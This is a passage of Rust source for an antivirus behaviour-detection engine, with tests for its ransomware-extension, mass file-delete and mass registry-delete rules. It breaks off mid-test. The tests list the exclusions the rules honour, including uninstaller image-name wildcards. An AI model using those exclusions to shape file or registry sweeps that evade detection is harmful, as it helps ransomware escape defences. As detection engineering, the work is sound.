//! Behaviour rules: a TOML rule language over the events the driver reports,
//! evaluated on a sliding window.
//!
//! # What this crate is for
//!
//! `av-rules` decides what a **file** is, by looking at its bytes. That answers
//! "is this program known-bad or structurally suspicious", and it cannot answer
//! *"what is this program doing"* — a renamed document, a value written under
//! `Run`, `winword.exe` starting `cmd.exe`. The driver was taught to report
//! those as three ordinary telemetry streams in October 2026 (file renames and
//! deletes, process lineage, registry changes), and this crate is what reads
//! them.
//!
//! The rule language is not YARA and is deliberately not byte-oriented: see
//! [`dsl`] for why. It is a table of predicates over an event's own fields, and
//! a [`RuleSet`] is a TOML document.
//!
//! | Module | What it holds |
//! |---|---|
//! | [`dsl`] | the language: [`Rule`], [`RuleSet`], and the validation that refuses a rule that could never fire |
//! | [`event`] | [`Record`], the engine's smaller copy of a driver event |
//! | [`engine`] | [`Engine`]: per-(rule, process) sliding windows and the lineage table |
//! | [`error`] | [`LoadError`] |
//!
//! # Every shipped rule is in the warning band
//!
//! A finding from this engine is **evidence, not a verdict**. Every rule in
//! [`RULES_TOML`] scores below [`av_core::VerdictThresholds::default`]'s
//! malicious threshold *on its own*, so no single behaviour event can quarantine
//! or delete anything — a rule firing adds to a score, and only a score that
//! crosses the threshold the rest of the product already uses can act. That is a
//! policy choice with a measurement behind it: a behaviour rule that convicts on
//! its own is a rule whose one measurement (this name, this count, this parent)
//! is treated as if it were a file's contents, and the difference between those
//! two kinds of evidence is the whole reason `av-rules` exists separately.
//!
//! `every_shipped_rule_is_in_the_warning_band` in this file is that policy as a
//! test.
//!
//! # Where it is wired in
//!
//! `av_service::host::Host::drain_driver`: every driver event that is not a
//! connection report is handed to [`Engine::observe_driver`] at the **top** of
//! that loop, before the arms that log it and route it, because several of those
//! arms `continue` — and a process start in particular teaches the engine who
//! started whom and then leaves through one of them. A returned [`Finding`] is
//! published as a [`av_ipc::Detection`] with [`av_ipc::DetectionAction::Reported`],
//! and only in the warning band.
//!
//! The order of work is the reason this note exists: the driver's three
//! telemetry streams were verified on a virtual machine first, and this crate is
//! written against what those streams were measured to contain. Connecting it
//! before that verification would have meant debugging a rule and a driver at
//! the same time.
//!
//! # Exclusions are a predicate, not a lower count
//!
//! [`Rule::path_excludes`] disqualifies a path that Windows churns by design —
//! measured: `svchost.exe` deleting keys under `\REGISTRY\A\{…}` fired the mass
//! key-delete rule on a healthy machine. Raising `count` would have let a real
//! sweep hide under the noise; an exclusion cannot make a rule match anything,
//! so it can only narrow.
//!
//! # Loading
//!
//! ```
//! let engine = av_behaviour::builtin().expect("the shipped rules parse");
//! assert!(engine.rules().len() >= 30);
//! ```
//!
//! [`av_ipc::Detection`]: av_ipc::Detection

#![forbid(unsafe_code)]
// Unwrapping is how a test asserts. The same exception every crate in the
// workspace makes, and only under `cfg(test)`: the engine itself returns
// `Result` and never panics on a rule file.
#![cfg_attr(test, allow(clippy::unwrap_used, clippy::expect_used))]

mod dsl;
mod engine;
mod error;
mod event;

pub use dsl::{Action, Detail, Rule, RuleSet, Subject};
pub use engine::{Engine, Finding, TICKS_PER_SECOND};
pub use error::LoadError;
pub use event::Record;

/// The rules shipped with the product, embedded in the binary.
///
/// Embedded rather than read from disk for the reason the detection rules are
/// not read from a user-writable directory: a file that decides what is
/// suspicious is a file an attacker would like to edit, and an embedded copy
/// cannot be. (The detection rules' larger corpus is on disk because it is
/// forty thousand lines and updatable; these are forty.)
pub const RULES_TOML: &str = include_str!("rules.toml");

/// An engine over [`RULES_TOML`].
pub fn builtin() -> Result<Engine, LoadError> {
    Engine::from_toml(RULES_TOML)
}

#[cfg(test)]
mod tests {
    use super::*;
    use av_core::VerdictThresholds;

    #[test]
    fn the_shipped_rules_parse() {
        let engine = builtin().expect("the shipped rule file parses and validates");
        assert!(engine.rules().len() >= 30, "the rule set shrank");
    }

    #[test]
    fn every_shipped_rule_is_in_the_warning_band() {
        // The policy from this module's header, as a test: no behaviour rule may
        // reach the malicious threshold by itself. `VerdictThresholds::classify`
        // is the same function the product uses, so this cannot drift from it.
        let thresholds = VerdictThresholds::default();
        let engine = builtin().expect("the shipped rules parse");
        for rule in engine.rules() {
            assert!(
                rule.score() < thresholds.malicious,
                "{} ({}) scores {}, which reaches the malicious threshold by \
                 itself; a behaviour rule must be evidence, not a verdict",
                rule.id,
                rule.name,
                rule.score()
            );
        }
    }

    #[test]
    fn every_shipped_rule_says_what_it_would_mean() {
        let engine = builtin().expect("the shipped rules parse");
        for rule in engine.rules() {
            assert!(
                rule.id.starts_with("BEH-"),
                "{} does not use the behaviour id prefix",
                rule.id
            );
            assert!(!rule.name.trim().is_empty(), "{} has no name", rule.id);
            assert!(
                rule.description.ends_with('.'),
                "{}'s description is not a sentence, so it will read badly in a \
                 warning: {:?}",
                rule.id,
                rule.description
            );
        }
    }

    #[test]
    fn the_shipped_rules_use_every_stream_the_driver_was_taught() {
        // If a whole telemetry stream has no rule, the increment that added it
        // is not being used — which is worth a failing test rather than a
        // paragraph in a report.
        let engine = builtin().expect("the shipped rules parse");
        let rules = engine.rules();
        for (what, wanted) in [
            ("a file rename rule", Action::FileRenamed),
            ("a file delete rule", Action::FileDeleted),
            ("a process start rule", Action::ProcessStarted),
            ("a registry rule", Action::RegistryChanged),
        ] {
            assert!(
                rules.iter().any(|rule| rule.action.contains(&wanted)),
                "there is no {what}"
            );
        }
        assert!(
            rules.iter().any(|rule| rule.subject == Subject::Registry),
            "no rule is about the registry"
        );
    }

    /// A registry event, in the shape `Record::from_driver` makes.
    fn registry_record(path: &str, at: u64, process_id: u32) -> Record {
        Record {
            timestamp: at,
            subject: Subject::Registry,
            action: Action::RegistryChanged,
            detail: Detail::RegistryKeyDeleted.code(),
            path: Some(path.to_string()),
            folded_path: Some(path.to_ascii_lowercase()),
            value: None,
            folded_value: None,
            command_line: None,
            process_id,
            parent_process_id: 4,
        }
    }

    #[test]
    fn an_excluded_path_cannot_satisfy_a_rule() {
        // The mechanism on a rule of its own, so the shipped rules' use of it is
        // not the only thing holding it up: an exclusion refuses, and a path
        // that does not contain it is unaffected.
        let mut engine = Engine::from_toml(
            r#"
            [[rule]]
            id = "BEH-9001"
            name = "test rule"
            description = "A test rule."
            subject = "registry"
            action = ["registry_changed"]
            path_contains = ["\\software\\"]
            path_excludes = ["\\scratch\\"]
            "#,
        )
        .expect("parses");
        let at = 10 * TICKS_PER_SECOND;
        assert!(
            engine
                .observe(&registry_record(
                    r"\REGISTRY\MACHINE\SOFTWARE\Scratch\Key",
                    at,
                    7
                ))
                .is_empty(),
            "the excluded path satisfied the rule"
        );
        assert_eq!(
            engine
                .observe(&registry_record(
                    r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Key",
                    at,
                    7
                ))
                .len(),
            1
        );
    }

    #[test]
    fn an_exclusion_refusal_is_tellable_apart_from_a_plain_non_match() {
        // What the engine's `trace` line rests on. `matches` answers yes or no,
        // and a "no" from an exclusion reads exactly like a "no" from an event
        // that never qualified — which is why an exclusion could only ever be
        // measured by the absence of a warning. `verdict` keeps the difference.
        use crate::dsl::Verdict;

        let engine = builtin().expect("the shipped rules parse");
        let rule = engine
            .rules()
            .iter()
            .find(|rule| rule.id == "BEH-0027")
            .expect("BEH-0027 is shipped");

        let instance = registry_record(
            r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\AarSvc_73452\Security",
            0,
            1,
        );
        assert!(
            matches!(
                rule.verdict(&instance, None, None),
                Verdict::Excluded(pattern)
                    if pattern == r"\registry\machine\system\controlset*\services\*_*"
            ),
            "the per-user instance path was not refused by the instance exclusion"
        );

        let elsewhere = registry_record(r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Product\Key", 0, 1);
        assert!(matches!(
            rule.verdict(&elsewhere, None, None),
            Verdict::Matches
        ));

        let mut other_detail = elsewhere;
        other_detail.detail = Detail::RegistryValueSet.code();
        assert!(
            matches!(rule.verdict(&other_detail, None, None), Verdict::NoMatch),
            "an event the rule never described was reported as excluded"
        );
    }

    #[test]
    fn an_excluded_image_cannot_satisfy_a_rule() {
        // The actor-based exclusion on a rule of its own, so the shipped rules
        // are not the only thing holding it up. Three answers are kept apart:
        // a known image on the list refuses, a known image off it does not,
        // and an image the engine never saw start cannot satisfy an exclusion
        // — a missing fact must never read as "this is the uninstaller".
        use crate::dsl::Verdict;

        let mut engine = Engine::from_toml(
            r#"
            [[rule]]
            id = "BEH-9002"
            name = "test rule"
            description = "A test rule."
            subject = "registry"
            action = ["registry_changed"]
            path_contains = ["\\vendor\\"]
            process_image_excludes = ["msiexec.exe", "*uninstall*.exe", "un_a.exe"]
            "#,
        )
        .expect("parses");
        let at = 20 * TICKS_PER_SECOND;
        let started = |pid: u32, image: &str, step: u64| av_ipc::DriverEvent {
            sequence: step,
            timestamp_100ns: at + step,
            action: av_ipc::DriverEventAction::ProcessStarted,
            subject: av_ipc::DriverSubject::Process,
            path: Some(std::path::PathBuf::from(image)),
            process_id: pid,
            parent_process_id: 4,
            thread_id: 0,
            detail: 0,
            value: None,
command_line: None,
            driver_state: None,
        };
        let path = r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Product\Key";

        engine.observe_driver(&started(1, r"C:\Windows\System32\msiexec.exe", 0));
        assert!(
            engine
                .observe(&registry_record(path, at + 10, 1))
                .is_empty(),
            "the excluded image satisfied the rule"
        );
        assert!(matches!(
            engine.rules()[0].verdict(&registry_record(path, 0, 1), Some("msiexec.exe"), None),
            Verdict::ExcludedByImage(pattern) if pattern == "msiexec.exe"
        ));

        engine.observe_driver(&started(
            2,
            r"C:\Users\example\AppData\Local\Temp\~nsuA.tmp\Un_A.exe",
            1,
        ));
        assert!(
            engine
                .observe(&registry_record(path, at + 11, 2))
                .is_empty(),
            "the wildcard image exclusion did not refuse `un_a.exe`"
        );

        assert_eq!(
            engine
                .observe(&registry_record(path, at + 12, 3))
                .len(),
            1,
            "an unknown image was refused by an exclusion"
        );

        engine.observe_driver(&started(4, r"C:\Windows\System32\cmd.exe", 2));
        assert_eq!(
            engine
                .observe(&registry_record(path, at + 13, 4))
                .len(),
            1,
            "an image off the list was refused"
        );
    }

    #[test]
    fn a_mass_delete_outside_the_application_hive_fires_through_the_driver_shape() {
        // The test VM's positive control, as code, and through
        // `Record::from_driver` rather than a hand-built `Record` so that a
        // mapping defect cannot hide behind the helper: thirty key deletes under
        // `HKCU\Software` in one second, which is what the VM produced on
        // 2026-10-18 20:02:13 and what the installed build did not warn about.
        let mut engine = builtin().expect("the shipped rules parse");
        let mut fired = Vec::new();
        for step in 0..30u64 {
            let event = av_ipc::DriverEvent {
                sequence: step,
                timestamp_100ns: 2_000 * TICKS_PER_SECOND + step,
                action: av_ipc::DriverEventAction::RegistryChanged,
                subject: av_ipc::DriverSubject::Registry,
                path: Some(std::path::PathBuf::from(format!(
                    r"\REGISTRY\USER\S-1-5-21-1-2-3-1001\Software\WenleBulk{step}"
                ))),
                process_id: 8620,
                parent_process_id: 0,
                thread_id: 0,
                detail: Detail::RegistryKeyDeleted.code(),
                value: None,
command_line: None,
                driver_state: None,
            };
            fired.extend(engine.observe_driver(&event));
        }
        assert_eq!(
            fired.len(),
            1,
            "the VM's positive control does not fire here either: {fired:?}"
        );
        assert_eq!(fired[0].rule_id, "BEH-0027");
    }

    #[test]
    fn the_mass_key_delete_rule_ignores_per_user_service_instances() {
        // Measured in the test VM on 2026-10-19: twenty-four per-user service
        // instances under `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\
        // <name>_<hex>`, holding twenty-four `Security` and six `TriggerInfo`
        // subkeys. The Service Control Manager deletes all thirty when a
        // session ends, so a healthy machine warned at every boot. Both halves
        // are kept true: quiet on that shape, and still firing elsewhere.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 1_000 * TICKS_PER_SECOND;
        let mut fired = Vec::new();
        for step in 0..30u64 {
            let subkey = if step < 24 { "Security" } else { "TriggerInfo" };
            let path = format!(
                r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\PerUserSvc{step:02}_{:05x}\{subkey}",
                73_452 + step
            );
            fired.extend(engine.observe(&registry_record(&path, at + step, 844)));
            assert!(
                fired.is_empty(),
                "a per-user service instance fired the rule: {fired:?}"
            );
        }
        for step in 0..30 {
            fired.extend(engine.observe(&registry_record(
                r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Product\Key",
                at + 1_000 + step,
                844,
            )));
        }
        assert_eq!(
            fired.len(),
            1,
            "the rule stopped working outside the instance keys: {fired:?}"
        );
        assert_eq!(fired[0].rule_id, "BEH-0027");
    }

    #[test]
    fn the_mass_key_delete_rule_ignores_the_search_index() {
        // Measured in the test VM on 2026-10-19: `SearchIndexer` deleted thirty
        // keys under `\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows Search\
        // Gather\Windows\SystemIndex\Sites\LocalHost\Paths\…` at a session end.
        // The index deletes and rebuilds that tree by design.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 1_000 * TICKS_PER_SECOND;
        let mut fired = Vec::new();
        for step in 0..30u64 {
            let path = format!(
                r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows Search\Gather\Windows\SystemIndex\Sites\LocalHost\Paths\{step}"
            );
            fired.extend(engine.observe(&registry_record(&path, at + step, 7_304)));
            assert!(
                fired.is_empty(),
                "the search index fired the rule: {fired:?}"
            );
        }
        for step in 0..30 {
            fired.extend(engine.observe(&registry_record(
                r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Product\Key",
                at + 1_000 + step,
                7_304,
            )));
        }
        assert_eq!(
            fired.len(),
            1,
            "the rule stopped working outside the search index: {fired:?}"
        );
        assert_eq!(fired[0].rule_id, "BEH-0027");
    }

    #[test]
    fn the_mass_file_delete_rule_ignores_defender_history() {
        // Measured on 2026-10-19 at 13:56:00, a minute after the behaviour
        // fixture had finished: Defender's maintenance deleted twenty-five
        // files under `C:\ProgramData\Microsoft\Windows Defender\Scans\History\
        // Store\…` in half a minute and BEH-0004 warned about a healthy
        // machine. The store is rotated and pruned by design. Both halves are
        // kept true: the rule stays quiet there, and the same number of
        // deletes somewhere else still fires.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 3_000 * TICKS_PER_SECOND;
        let delete = |path: String, step: u64| av_ipc::DriverEvent {
            sequence: step,
            timestamp_100ns: at + step,
            action: av_ipc::DriverEventAction::FileDeleted,
            subject: av_ipc::DriverSubject::File,
            path: Some(std::path::PathBuf::from(path)),
            process_id: 3_176,
            parent_process_id: 0,
            thread_id: 0,
            detail: 0,
            value: None,
command_line: None,
            driver_state: None,
        };
        for step in 0..30u64 {
            let findings = engine.observe_driver(&delete(
                format!(
                    r"C:\ProgramData\Microsoft\Windows Defender\Scans\History\Store\{step:032X}"
                ),
                step,
            ));
            assert!(
                findings.is_empty(),
                "the Defender history store fired the rule: {findings:?}"
            );
        }
        let mut fired = Vec::new();
        for step in 0..30u64 {
            fired.extend(engine.observe_driver(&delete(
                format!(r"C:\Users\example\AppData\Local\Temp\del{step:02}.tmp"),
                1_000 + step,
            )));
        }
        assert_eq!(
            fired.len(),
            1,
            "the rule stopped working outside the history store: {fired:?}"
        );
        assert_eq!(fired[0].rule_id, "BEH-0004");
    }

    #[test]
    fn the_mass_file_rules_ignore_the_comms_store() {
        // Measured on the build machine on 2026-10-19 at 14:34:55 and
        // 14:34:57, with the driver loaded and nothing else running: one
        // `svchost.exe -k UnistackSvcGroup` (the instance hosting UnistoreSvc,
        // UserDataSvc and PimIndexMaintenanceSvc for the signed-in account)
        // renamed twenty files under `AppData\Local\Comms\Unistore\data\` and
        // then deleted twenty-five under `AppData\Local\Comms\Volatile\POOM\`.
        // BEH-0003 and BEH-0004 both warned about a healthy machine. The store
        // is rewritten by its own maintenance. Both halves are kept true: both
        // rules stay quiet in the two measured subtrees, and the same counts
        // anywhere else still fire.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 4_000 * TICKS_PER_SECOND;
        let event = |action: av_ipc::DriverEventAction, path: String, process_id: u32, step: u64| {
            av_ipc::DriverEvent {
                sequence: step,
                timestamp_100ns: at + step,
                action,
                subject: av_ipc::DriverSubject::File,
                path: Some(std::path::PathBuf::from(path)),
                process_id,
                parent_process_id: 0,
                thread_id: 0,
                detail: 0,
                value: None,
command_line: None,
                driver_state: None,
            }
        };
        let mut quiet = Vec::new();
        for step in 0..30u64 {
            quiet.extend(engine.observe_driver(&event(
                av_ipc::DriverEventAction::FileRenamed,
                format!(r"C:\Users\example\AppData\Local\Comms\Unistore\data\2\n\{step:032X}.dat"),
                1_512,
                step,
            )));
            quiet.extend(engine.observe_driver(&event(
                av_ipc::DriverEventAction::FileDeleted,
                format!(r"C:\Users\example\AppData\Local\Comms\Volatile\POOM\{step:04X}.tmp"),
                1_513,
                100 + step,
            )));
        }
        assert!(
            quiet.is_empty(),
            "the communication store fired a mass-file rule: {quiet:?}"
        );
        let mut renamed = Vec::new();
        for step in 0..30u64 {
            renamed.extend(engine.observe_driver(&event(
                av_ipc::DriverEventAction::FileRenamed,
                format!(r"C:\Users\example\Documents\photo{step:02}.keep"),
                1_512,
                1_000 + step,
            )));
        }
        assert_eq!(
            renamed.len(),
            1,
            "the rename rule stopped working outside the store: {renamed:?}"
        );
        assert_eq!(renamed[0].rule_id, "BEH-0003");
        let mut deleted = Vec::new();
        for step in 0..30u64 {
            deleted.extend(engine.observe_driver(&event(
                av_ipc::DriverEventAction::FileDeleted,
                format!(r"C:\Users\example\AppData\Local\Temp\note{step:02}.tmp"),
                1_513,
                2_000 + step,
            )));
        }
        assert_eq!(
            deleted.len(),
            1,
            "the delete rule stopped working outside the store: {deleted:?}"
        );
        assert_eq!(deleted[0].rule_id, "BEH-0004");
    }

    #[test]
    fn the_mass_file_rules_ignore_the_churn_measured_on_the_host() {
        // The host measurement of 2026-10-19, 14:41 to 15:42, with the driver
        // loaded. Each path below produced BEH-0003 or BEH-0004 about a machine
        // with nothing wrong with it. Both rules are walked over the same
        // table: every one of these was renamed or deleted in bulk by the
        // component that owns the tree, and the rule must stay quiet in all of
        // them.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 5_000 * TICKS_PER_SECOND;
        let table = [
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Windows\AppCompat\Programs\InventoryApplicationFile.db-journal"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Windows\Prefetch\RUST_OUT.EXE-9144A8B8.pf"),
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Windows\System32\SRU\SRU0B50D.log"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Windows\System32\config\systemprofile\AppData\Local\CM2E8DB.tmp"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\$Extend\$Deleted\002800000005B9DC1F288C24"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Windows\System32\config\systemprofile\AppData\Local\D3DSCache\eaa\6F.dxcache-shm"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Microsoft\Edge\User Data\GrShaderCache\f_000120"),
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Users\example\AppData\Local\Google\Chrome\User Data\System Profile\Secure Preferences"),
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Users\example\AppData\Local\com.ccswitch.desktop\EBWebView\Default\e75cf3fc.tmp"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Microsoft\OneDrive\logs\Personal\SyncEngine-2026-10-19.0629.6848.4.odl"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Roaming\Surfshark\settings-log.dat"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Roaming\.minecraft\staging\af1a4f9a"),
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Users\example\AppData\LocalLow\SogouPY\sgim_gd_s4_usrbg.bin"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Packages\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\AC\Microsoft\CryptnetUrlCache\Content\E2C6"),
            // 2026-10-19 15:56 to 16:01, a Steam update and update check.
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Program Files (x86)\Steam\bin\cef\cef.win7x64\locales\bg.pak"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Program Files (x86)\Steam\bin\gameoverlayui.dll.old"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Program Files (x86)\Steam\shader_cache_temp_dir_vk_32\nvidiav1"),
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Users\example\AppData\Local\Steam\htmlcache\Default\Extensions\Temp\scoped_dir_steam15804_2014320932\CRX_INSTALL"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Temp\scoped_dir_steam15804_2491107\CRX_INSTALL\_locales\pt_PT\messages.json"),
            // Firefox's cache rotation, 16:00:49.
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Mozilla\Firefox\Profiles\som7e1ie.default-release\cache2\ce_T151c2VyQ29udGV4dElkPTUs"),
            // The eight-app installation round of 2026-10-19, 17:03 to 17:16.
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Program Files\WindowsApps\Deleted\Microsoft.Winget.Source_2026.1014.1230.10_neutral__8wekyb3d8bbwe21efc3fd-aed8-43d3-bbfa-1f15699ba70b\Assets\contrast-white\AppPackageStoreLogo.scale-125_contrast-white.png"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.PowerToys.SparseApp_0.102.2862.0_neutral__8wekyb3d8bbwe"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Config.Msi\8d8c90.rbf"),
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Users\example\AppData\Local\Programs\Inno Setup 6\Languages\Arabic.isl"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Programs\Obsidian\locales\en-US.pak"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\PowerToys\WinUI3Apps\Microsoft.Bcl.AsyncInterfaces.dll"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Temp\nsgDFF9.tmp\7z-out\locales\en-US.pak"),
            // The 17:26 to 18:16 half of the same round: the font cache's
            // rotation, the application-impact store, and 7-Zip's extractor.
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\FontCache-Obsolete-131.dat"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Windows\AppCompat\AIDD\Buffer\aidd_E0A2D1C4.txt"),
            (av_ipc::DriverEventAction::FileRenamed, r"C:\Users\example\AppData\Local\FontCache\FontCache-Obsolete-132.dat"),
            (av_ipc::DriverEventAction::FileDeleted, r"C:\Users\example\AppData\Local\Temp\7zS1A2B\7z-out\locales\en-US.pak"),
        ];
        for (index, (action, path)) in table.iter().enumerate() {
            // Twenty-five events of each shape, which is over both thresholds.
            let process_id = 6_000 + index as u32;
            for step in 0..30u64 {
                let findings = engine.observe_driver(&av_ipc::DriverEvent {
                    sequence: step,
                    timestamp_100ns: at + step,
                    action: *action,
                    subject: av_ipc::DriverSubject::File,
                    path: Some(std::path::PathBuf::from(*path)),
                    process_id,
                    parent_process_id: 0,
                    thread_id: 0,
                    detail: 0,
                    value: None,
command_line: None,
                    driver_state: None,
                });
                assert!(
                    findings.is_empty(),
                    "a churn tree fired a mass-file rule: {path} -> {findings:?}"
                );
            }
        }
    }

    #[test]
    fn the_mass_rules_ignore_the_uninstallers_measured_on_the_host() {
        // The host measurement of 2026-10-19, 17:03 to 18:16: twenty-two
        // install and uninstall pairs driven through winget. An uninstaller
        // removing the product it was installed to remove renames and deletes
        // that product's own tree in bulk, and no path can separate it from a
        // sweep — `C:\Program Files\Audacity\…` is the same path either way.
        // The actor is what separates them. Each uninstaller below is named as
        // it was measured, and each must stay quiet; the same sweep by an
        // image that is not an uninstaller must still fire.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 5_500 * TICKS_PER_SECOND;
        let event = |action: av_ipc::DriverEventAction,
                     subject: av_ipc::DriverSubject,
                     path: &str,
                     process_id: u32,
                     detail: u32,
                     step: u64| av_ipc::DriverEvent {
            sequence: step,
            timestamp_100ns: at + step,
            action,
            subject,
            path: Some(std::path::PathBuf::from(path)),
            process_id,
            parent_process_id: 0,
            thread_id: 0,
            detail,
            value: None,
command_line: None,
            driver_state: None,
        };
        // Image first: the engine learns an actor from its process start.
        for (index, image) in [
            r"C:\Windows\System32\msiexec.exe",
            r"C:\Program Files\Audacity\unins000.exe",
            r"C:\Users\example\AppData\Local\Temp\~nsuA.tmp\Un_A.exe",
            r"C:\Users\example\AppData\Local\Slack\Update.exe",
        ]
        .iter()
        .enumerate()
        {
            engine.observe_driver(&event(
                av_ipc::DriverEventAction::ProcessStarted,
                av_ipc::DriverSubject::Process,
                image,
                7_100 + index as u32,
                0,
                0,
            ));
        }
        let table = [
            // The actor, the rule it used to fire, and the shape of the sweep.
            (7_100u32, av_ipc::DriverEventAction::FileRenamed, av_ipc::DriverSubject::File,
             0u32, r"C:\Program Files\Audacity\Languages\bg.po"),
            (7_101, av_ipc::DriverEventAction::FileDeleted, av_ipc::DriverSubject::File,
             0, r"C:\Program Files\Audacity\plug-ins\nyquist\README.txt"),
            (7_102, av_ipc::DriverEventAction::FileDeleted, av_ipc::DriverSubject::File,
             0, r"C:\Program Files\Zoom\bin\Zoom.exe"),
            (7_103, av_ipc::DriverEventAction::FileDeleted, av_ipc::DriverSubject::File,
             0, r"C:\Users\example\AppData\Local\Slack\app-4.39.90\locales\en-US.pak"),
            (7_100, av_ipc::DriverEventAction::RegistryChanged, av_ipc::DriverSubject::Registry,
             Detail::RegistryKeyDeleted.code(),
             r"\REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{00021401-0000-0000-C000-000000000046}\InprocServer32"),
        ];
        for (process_id, action, subject, detail, path) in &table {
            for step in 0..40u64 {
                let findings = engine.observe_driver(&event(
                    *action, *subject, path, *process_id, *detail, step,
                ));
                assert!(
                    findings.is_empty(),
                    "an uninstaller fired a mass rule: {path} -> {findings:?}"
                );
            }
        }

        // The same three shapes by an image that is not an uninstaller.
        engine.observe_driver(&event(
            av_ipc::DriverEventAction::ProcessStarted,
            av_ipc::DriverSubject::Process,
            r"C:\Windows\System32\cmd.exe",
            7_200,
            0,
            0,
        ));
        let mut renamed = Vec::new();
        for step in 0..40u64 {
            renamed.extend(engine.observe_driver(&event(
                av_ipc::DriverEventAction::FileRenamed,
                av_ipc::DriverSubject::File,
                r"C:\Program Files\Audacity\Languages\bg.po",
                7_200,
                0,
                step,
            )));
        }
        assert_eq!(
            renamed.len(),
            1,
            "the rename rule stopped reporting when the actor changed: {renamed:?}"
        );
        assert_eq!(renamed[0].rule_id, "BEH-0003");

        let mut deleted = Vec::new();
        for step in 0..40u64 {
            deleted.extend(engine.observe_driver(&event(
                av_ipc::DriverEventAction::FileDeleted,
                av_ipc::DriverSubject::File,
                r"C:\Program Files\Zoom\bin\Zoom.exe",
                7_200,
                0,
                step,
            )));
        }
        assert_eq!(
            deleted.len(),
            1,
            "the delete rule stopped reporting when the actor changed: {deleted:?}"
        );
        assert_eq!(deleted[0].rule_id, "BEH-0004");

        let mut keys = Vec::new();
        for step in 0..40u64 {
            keys.extend(engine.observe_driver(&event(
                av_ipc::DriverEventAction::RegistryChanged,
                av_ipc::DriverSubject::Registry,
                r"\REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{00021401-0000-0000-C000-000000000046}\InprocServer32",
                7_200,
                Detail::RegistryKeyDeleted.code(),
                step,
            )));
        }
        assert_eq!(
            keys.len(),
            1,
            "the key-delete rule stopped reporting when the actor changed: {keys:?}"
        );
        assert_eq!(keys[0].rule_id, "BEH-0027");
    }

    #[test]
    fn the_ransomware_extension_rule_ignores_steams_encrypted_decoder() {
        // Measured on the host on 2026-10-19 at 15:57 and 16:00. Steam ships
        // `libx264-142.dll.crypt` beside its `.md5` (both dated 2026-07-02),
        // and its updater renamed the pair during an update. The same suffix
        // anywhere else is still the signal the rule exists for.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 10_000 * TICKS_PER_SECOND;
        let event = |path: &str, step: u64, process_id: u32| av_ipc::DriverEvent {
            sequence: step,
            timestamp_100ns: at + step,
            action: av_ipc::DriverEventAction::FileRenamed,
            subject: av_ipc::DriverSubject::File,
            path: Some(std::path::PathBuf::from(path)),
            process_id,
            parent_process_id: 0,
            thread_id: 0,
            detail: 0,
            value: None,
command_line: None,
            driver_state: None,
        };
        assert!(
            engine
                .observe_driver(&event(
                    r"C:\Program Files (x86)\Steam\libx264-142.dll.crypt",
                    0,
                    10_001,
                ))
                .is_empty(),
            "a Steam update fired the ransomware-extension rule"
        );
        let fired = engine.observe_driver(&event(
            r"C:\Users\example\Documents\report.docx.crypt",
            1,
            10_002,
        ));
        assert_eq!(fired.len(), 1, "{fired:?}");
        assert_eq!(fired[0].rule_id, "BEH-0001");
    }

    #[test]
    fn the_document_rules_only_count_a_users_document_roots() {
        // The 17:03 to 18:16 measurement of 2026-10-19: a GIMP uninstall
        // deleted the program's own `.txt` and `.png` files, a Joplin
        // uninstall did the same under its resources, and a winget source
        // update removed package artwork. The suffix list alone cannot tell
        // those from a user's documents, so the rule also asks *whose* — and
        // only a user's document roots answer yes. Nineteen events per shape:
        // below BEH-0003's twenty and BEH-0004's twenty-five, so only the
        // document rules can speak.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 11_500 * TICKS_PER_SECOND;
        let event = |action: av_ipc::DriverEventAction, path: String, step: u64, process_id: u32| {
            av_ipc::DriverEvent {
                sequence: step,
